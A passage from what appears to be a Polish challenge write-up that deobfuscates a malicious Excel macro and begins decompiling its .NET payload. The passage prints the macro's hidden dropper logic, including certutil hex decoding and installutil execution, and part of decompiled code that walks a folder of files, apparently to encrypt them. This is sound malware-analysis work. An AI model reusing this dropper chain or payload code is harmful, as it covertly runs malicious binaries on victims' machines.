</span></span><span style=display:flex><span>        value <span style=color:#f92672>=</span> worksh<span style=color:#f92672>.</span>Cells(row, col)
</span></span><span style=display:flex><span>        outValue <span style=color:#f92672>=</span> value <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#convert to hex</span>
</span></span><span style=display:flex><span>        outValueHigh <span style=color:#f92672>=</span> outValue <span style=color:#f92672>//</span> <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>        Digit1 <span style=color:#f92672>=</span> Mid(hexDigits, outValueHigh <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>        buffer <span style=color:#f92672>=</span> buffer <span style=color:#f92672>+</span> Digit1
</span></span><span style=display:flex><span>        outValueLow <span style=color:#f92672>=</span> outValue <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>        Digit2 <span style=color:#f92672>=</span> Mid(hexDigits, outValueLow <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>        buffer <span style=color:#f92672>=</span> buffer <span style=color:#f92672>+</span> Digit2
</span></span><span style=display:flex><span>        row <span style=color:#f92672>=</span> row <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( row <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>65536</span> ) :
</span></span><span style=display:flex><span>            col <span style=color:#f92672>=</span> col <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>            row <span style=color:#f92672>=</span> startrow
</span></span><span style=display:flex><span>        bufpos <span style=color:#f92672>=</span> bufpos <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( bufpos <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span> ) :
</span></span><span style=display:flex><span>            mucha<span style=color:#f92672>.</span>writeLine(( buffer ))
</span></span><span style=display:flex><span>            bufpos <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>            buffer <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    mucha<span style=color:#f92672>.</span>writeLine(( buffer ))
</span></span><span style=display:flex><span>    mucha<span style=color:#f92672>.</span>Close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>findframeworkdir</span>(fso, basedir):
</span></span><span style=display:flex><span>    basedirlen <span style=color:#f92672>=</span> Len(basedir)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> objFolder <span style=color:#f92672>in</span> fso<span style=color:#f92672>.</span>GetFolder(basedir)<span style=color:#f92672>.</span>SubFolders:
</span></span><span style=display:flex><span>        res <span style=color:#f92672>=</span> InStr(basedirlen <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, objFolder, <span style=color:#e6db74>&#39;v4.&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> res <span style=color:#f92672>==</span> basedirlen <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>            fn_return_value <span style=color:#f92672>=</span> objFolder
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> fn_return_value
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> fn_return_value
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>test</span>():
</span></span><span style=display:flex><span>    p <span style=color:#f92672>=</span> String()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    tmpname <span style=color:#f92672>=</span> String()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    fso <span style=color:#f92672>=</span> Object()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    kaczka <span style=color:#f92672>=</span> String()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    insutilfullname <span style=color:#f92672>=</span> String()
</span></span><span style=display:flex><span>    Sheets[<span style=color:#e6db74>&#39;Arkusz2&#39;</span>]<span style=color:#f92672>.</span>Visible <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    Sheets[<span style=color:#e6db74>&#39;Dane&#39;</span>]<span style=color:#f92672>.</span>Visible <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    fso <span style=color:#f92672>=</span> CreateObject(getGizmo(<span style=color:#ae81ff>9</span>))
</span></span><span style=display:flex><span>    kaczka <span style=color:#f92672>=</span> fso<span style=color:#f92672>.</span>GetSpecialFolder(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    frameworkdir <span style=color:#f92672>=</span> findframeworkdir(fso, getGizmo(<span style=color:#ae81ff>5</span>))
</span></span><span style=display:flex><span>    insutilfullname <span style=color:#f92672>=</span> frameworkdir <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> getGizmo(<span style=color:#ae81ff>11</span>)
</span></span><span style=display:flex><span>    tmpname <span style=color:#f92672>=</span> kaczka <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> fso<span style=color:#f92672>.</span>getTempName()
</span></span><span style=display:flex><span>    tmpname2 <span style=color:#f92672>=</span> kaczka <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> fso<span style=color:#f92672>.</span>getTempName()
</span></span><span style=display:flex><span>    saveHexFile(fso, tmpname, Worksheets(<span style=color:#e6db74>&#39;dane&#39;</span>), <span style=color:#ae81ff>100</span>)
</span></span><span style=display:flex><span>    fun1(getGizmo(<span style=color:#ae81ff>4</span>), <span style=color:#e6db74>&#39;-&#39;</span> <span style=color:#f92672>+</span> getGizmo(<span style=color:#ae81ff>6</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39; &#39;</span> <span style=color:#f92672>+</span> tmpname <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39; &#39;</span> <span style=color:#f92672>+</span> tmpname2)
</span></span><span style=display:flex><span>    fun1(insutilfullname, <span style=color:#e6db74>&#39;&#39;</span> <span style=color:#f92672>+</span> tmpname2)
</span></span><span style=display:flex><span>    Sheets[<span style=color:#e6db74>&#39;Arkusz1&#39;</span>]<span style=color:#f92672>.</span>Visible <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    Sheets[<span style=color:#e6db74>&#39;Arkusz2&#39;</span>]<span style=color:#f92672>.</span>Visible <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    Sheets[<span style=color:#e6db74>&#39;Dane&#39;</span>]<span style=color:#f92672>.</span>Visible <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>Worksheet_Change</span>(Target):
</span></span><span style=display:flex><span>    KeyCells <span style=color:#f92672>=</span> Range()
</span></span><span style=display:flex><span>    answered <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    Start <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>    Number <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> vbForRange(Start, Start <span style=color:#f92672>+</span> Number <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> Range(<span style=color:#e6db74>&#39;B&#39;</span> <span style=color:#f92672>+</span> CStr(i))<span style=color:#f92672>.</span>value <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;-&#39;</span>:
</span></span><span style=display:flex><span>            answered <span style=color:#f92672>=</span> answered <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> answered <span style=color:#f92672>==</span> Number:
</span></span><span style=display:flex><span>        verify
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>verify</span>():
</span></span><span style=display:flex><span>    test
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># VB2PY (UntranslatedCode) Attribute VB_Name = &#34;Arkusz1&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># VB2PY (UntranslatedCode) Attribute VB_Base = &#34;0{00020820-0000-0000-C000-000000000046}&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># VB2PY (UntranslatedCode) Attribute VB_GlobalNameSpace = False</span>
</span></span><span style=display:flex><span><span style=color:#75715e># VB2PY (UntranslatedCode) Attribute VB_Creatable = False</span>
</span></span><span style=display:flex><span><span style=color:#75715e># VB2PY (UntranslatedCode) Attribute VB_PredeclaredId = True</span>
</span></span><span style=display:flex><span><span style=color:#75715e># VB2PY (UntranslatedCode) Attribute VB_Exposed = True</span>
</span></span><span style=display:flex><span><span style=color:#75715e># VB2PY (UntranslatedCode) Attribute VB_TemplateDerived = False</span>
</span></span><span style=display:flex><span><span style=color:#75715e># VB2PY (UntranslatedCode) Attribute VB_Customizable = True</span>
</span></span></code></pre></div><p>Całość przetwarzania zaczyna się od funkcji <code>Worksheet_Change</code>, która obserwuje zmiany dokonywane w arkuszu z &ldquo;formularzem&rdquo;. W przypadku, gdy wykryte zostanie pomyslne wypełnienie arkusza wywoływana jest funkcja <code>verify</code>, która przekazuje sterowanie do funkcji <code>test</code>, w której zaimplementowano główną logikę programu. Pobieżna analiza wskazuje, że nie jest to bezpośrednio funkcja ingerująca w system plików (np. wywołująca proces szyfrowania), a jedynie kolejna warstwa przygotowania payloadu.</p><p>Funkcja <code>test</code> korzysta z funkcji pomocniczych <code>GetGizmo</code>, <code>saveHexFile</code> oraz <code>fun1</code>. Pierwsza z nich swoje działanie opiera na drugim arkuszu, którego zawartość zaprezentowana została w pliku <code>asdf.csv.1</code>. Wyliczając offset pobiera i zwraca dane z określonej komórki. <code>saveHexFile</code> konwertuje liczby na system szesnastkowy i zapisuje do pliku. natomiast funkcja <code>fun1</code> służy do wywoływania poleceń przez wykorzystanie metody <code>ShellExecute</code>. Aby zebrać w jednym miejscu kolejne operacje wykonywane w ramach funkcji <code>test</code> stworzyłem brzydki skrypt pokazany poniżej:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>~/</span>devp<span style=color:#f92672>/</span>tmp <span style=color:#960050;background-color:#1e0010>❯</span> cat arkusz_solver<span style=color:#f92672>.</span>py 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#! /usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gizmo <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span><span style=color:#ae81ff>34</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>22</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>30</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>48</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>36</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>23</span>,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;open&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;decodehex -f&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>25</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;scripting.filesystemobject&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>43</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;new:&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;0883f19c0a00-5548-1d11-1a2f-09dfa80c&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;c:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>microsoft.net</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Framework</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;installutil.exe&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;certutil.exe&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getgizmo</span>(loc):
</span></span><span style=display:flex><span>    ind <span style=color:#f92672>=</span> gizmo[loc <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(ind)</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> isinstance(ind, int):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>Exception</span>
</span></span><span style=display:flex><span>    ind <span style=color:#f92672>=</span> ind <span style=color:#f92672>-</span> <span style=color:#ae81ff>15</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(ind)</span>
</span></span><span style=display:flex><span>    thing <span style=color:#f92672>=</span> gizmo[ind]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> thing
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>konwert</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;GetObject(</span><span style=color:#e6db74>{</span>getgizmo(<span style=color:#ae81ff>3</span>)<span style=color:#e6db74>}{</span>getgizmo(<span style=color:#ae81ff>1</span>)[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>).Document_Application&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>test</span>():
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;FSO = </span><span style=color:#e6db74>{</span>getgizmo(<span style=color:#ae81ff>9</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>getgizmo(<span style=color:#ae81ff>5</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;frameworkdir + </span><span style=color:#ae81ff>\&#39;\\\&#39;</span><span style=color:#e6db74> + = </span><span style=color:#e6db74>{</span>getgizmo(<span style=color:#ae81ff>11</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>getgizmo(<span style=color:#ae81ff>4</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>getgizmo(<span style=color:#ae81ff>6</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>getgizmo(<span style=color:#ae81ff>3</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>getgizmo(<span style=color:#ae81ff>1</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>getgizmo(<span style=color:#ae81ff>2</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;fun1(</span><span style=color:#e6db74>{</span>getgizmo(<span style=color:#ae81ff>4</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>, -</span><span style=color:#e6db74>{</span>getgizmo(<span style=color:#ae81ff>6</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74> tmpfile1 tmpfile2)&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;fun1(installutil.exe, tmpfil2&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Konwert = </span><span style=color:#e6db74>{</span>konwert()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    test()
</span></span></code></pre></div><p>Wynikiem działania <code>arkusz_solver.py</code> jest zdeobfuskowany fragment kodu funkcji <code>test</code>, który wygląda następująco:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp ❯ python arkusz_solver.py 
</span></span><span style=display:flex><span>FSO <span style=color:#f92672>=</span> scripting.filesystemobject
</span></span><span style=display:flex><span>c:<span style=color:#ae81ff>\w</span>indows<span style=color:#ae81ff>\m</span>icrosoft.net<span style=color:#ae81ff>\F</span>ramework<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>frameworkdir + <span style=color:#e6db74>&#39;\&#39;</span> + <span style=color:#f92672>=</span> installutil.exe
</span></span><span style=display:flex><span>certutil.exe
</span></span><span style=display:flex><span>decodehex -f
</span></span><span style=display:flex><span>new:
</span></span><span style=display:flex><span>0883f19c0a00-5548-1d11-1a2f-09dfa80c
</span></span><span style=display:flex><span>open
</span></span><span style=display:flex><span>fun1<span style=color:#f92672>(</span>certutil.exe, -decodehex -f tmpfile1 tmpfile2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>fun1<span style=color:#f92672>(</span>installutil.exe, tmpfil2
</span></span><span style=display:flex><span>Konwert <span style=color:#f92672>=</span> GetObject<span style=color:#f92672>(</span>new:c08afd90-f2a1-11d1-8455-00a0c91f3880<span style=color:#f92672>)</span>.Document_Application
</span></span></code></pre></div><p>Ubierając w kontekst wartości zwrócone przez powyższy skrypt otrzymujemy następujący obraz sytuacji:</p><ul><li>dostępne (<code>Sheets[_nazwa_].Visible = True</code>) stają się arkusze <code>Arkusz2</code> oraz <code>dane</code></li><li><code>fso</code> zostaje instancją <code>ScriptingObject</code></li><li><code>kaczka</code> to folder <a href=https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/getspecialfolder-method>tymaczasowy</a></li><li><code>frameworkdir</code> wskazuje na ścieżkę <code>c:\windows\microsoft.net\Framework\</code></li><li><code>insutilfullname</code> wskazuje na ścieżkę do <code>installutil.exe</code></li><li>tworzone są dwie nazwy plików tymczasowych w folderze wskazywanym przez mienną <code>kaczka</code>, kolejno <code>tmpname</code> oraz <code>tmpname2</code></li><li>Zapisywany jest plik o nazwie przechowywanej w <code>tmpname</code> z wykorzystaniem funkcji <code>saveHexFile</code>, na podstawie danych z arkusza <code>dane</code></li><li>wywoływana jest funkcja <code>fun1</code> w celu wywołania polecenia <code>certutil -decodehex -f tmpfile1 tmpfile2</code>, które to polecenie przekształca heksadecymalną formę arkusza <code>dane do pliku binarnego</code></li><li>wywoływana jest funkcja <code>fun1</code> w celu wywołania polecenia <code>installutil.exe tmpfile2</code>, które to polecenie ma na celu <em>zainstalowanie usługi</em> z wykorzystaniem narzędzia <a href=https://docs.microsoft.com/pl-pl/dotnet/framework/tools/installutil-exe-installer-tool>installutil</a>, podanej jako parametr <code>assembly</code>, czyli zdekodowanej postaci arkusza <code>dane</code></li><li>na koniec ukrywane są zbędne arkusze danych</li></ul><p>Tym samym część zagadki została rozwiązana. W celu pozyskania binarki wykorzystałem poniższy skrypt:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> csv
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>savehexfile</span>(fname, offset):
</span></span><span style=display:flex><span>    fe <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(fname, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        content <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>        lines <span style=color:#f92672>=</span> content<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> l <span style=color:#f92672>in</span> lines:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> l:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>            a <span style=color:#f92672>=</span> int(l) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>            fe <span style=color:#f92672>+=</span> format(a, <span style=color:#e6db74>&#39;02x&#39;</span>)
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(fe[offset: ])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> fe
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    <span style=color:#75715e># savehexfile(&#39;asdf.csv.2&#39;, 100)</span>
</span></span><span style=display:flex><span>    savehexfile(<span style=color:#e6db74>&#39;asdf.csv.2&#39;</span>, <span style=color:#ae81ff>101</span>)
</span></span></code></pre></div><p>Wynikiem jego działania jest plik tekstowy zawierający dane tekstowe będące reprezentacją pliku wykonywalnego.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/Downloads/wladcysieci/tmp ❯ file output.txt 
</span></span><span style=display:flex><span>output.txt: ASCII text, with very long lines
</span></span><span style=display:flex><span>~/Downloads/wladcysieci/tmp ❯ wc output.txt 
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>1</span>     <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>43932</span> output.txt
</span></span></code></pre></div><p>Po konwersji otrzymujemy plik PE32 napisany z wykorzystaniem technologii .NET. Pewnie jest to payload, który dokonuje szyfrowania plików na dysku. W wyniku braku środowiska do debugowania procesów systemów z rodziny Windows dokonałem tylko analizy statycznej. Analizy, która wystarczyła aby rozwiązać powyższe zadanie.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/Downloads/wladcysieci/tmp ❯ cat output.txt | xxd -r -p &gt; exec.bin
</span></span><span style=display:flex><span>~/Downloads/wladcysieci/tmp ❯ file exec.bin 
</span></span><span style=display:flex><span>file.bin: PE32 executable <span style=color:#f92672>(</span>GUI<span style=color:#f92672>)</span> Intel <span style=color:#ae81ff>80386</span> Mono/.Net assembly, <span style=color:#66d9ef>for</span> MS Windows
</span></span></code></pre></div><h2 id=inżynieria-wsteczna-pliku-pe>Inżynieria wsteczna pliku PE<a href=#inżynieria-wsteczna-pliku-pe class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Plik wykonywalny zdekompliwałem z użyciem DotPeeka.</p><p><img src=./dotPeek_overall.png alt=Dotpeek>
Na pierwszy rzut oka binarka wygląda na zobfuskowaną. Nie mam dużego doświadczenia w analizie .NETa, ale jeśli to nie obfuskacja to chociaż brak symboli debugera, co sprawia, że czytanie kodu nie jest zbyt przyjemne.</p><p>Główna logika zadania została zdekompilowana do kasy <code>C1255198513</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span>  <span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>C1255198513</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> C3554254475()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#75715e>// ISSUE: object of a compiler-generated type is created</span>
</span></span><span style=display:flex><span>      <span style=color:#75715e>// ISSUE: variable of a compiler-generated type</span>
</span></span><span style=display:flex><span>      C1255198513.C3554254475 c3554254475 = <span style=color:#66d9ef>new</span> C1255198513.C3554254475();
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>string</span> path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), <span style=color:#e6db74>&#34;tajne&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#75715e>// ISSUE: reference to a compiler-generated field</span>
</span></span><span style=display:flex><span>      c3554254475.C3554254475 = <span style=color:#66d9ef>new</span> Random();
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>int</span> num1 = (<span style=color:#66d9ef>int</span>) MessageBox.Show(<span style=color:#e6db74>&#34;Kill&#39;em all Started&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>try</span>
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// ISSUE: reference to a compiler-generated method</span>
</span></span><span style=display:flex><span>        IOrderedEnumerable&lt;<span style=color:#66d9ef>string</span>&gt; orderedEnumerable = ((IEnumerable&lt;<span style=color:#66d9ef>string</span>&gt;) Directory.GetFiles(path, <span style=color:#e6db74>&#34;*.*&#34;</span>, SearchOption.AllDirectories)).Where&lt;<span style=color:#66d9ef>string</span>&gt;((Func&lt;<span style=color:#66d9ef>string</span>, <span style=color:#66d9ef>bool</span>&gt;) (obj0 =&gt; <span style=color:#66d9ef>char</span>.IsLetter(obj0[<span style=color:#ae81ff>0</span>]))).Where&lt;<span style=color:#66d9ef>string</span>&gt;((Func&lt;<span style=color:#66d9ef>string</span>, <span style=color:#66d9ef>bool</span>&gt;) (obj0 =&gt; !C3554254475.C3904355907.C1255198513(obj0))).OrderBy&lt;<span style=color:#66d9ef>string</span>, <span style=color:#66d9ef>int</span>&gt;(<span style=color:#66d9ef>new</span> Func&lt;<span style=color:#66d9ef>string</span>, <span style=color:#66d9ef>int</span>&gt;(c3554254475.C3554254475));
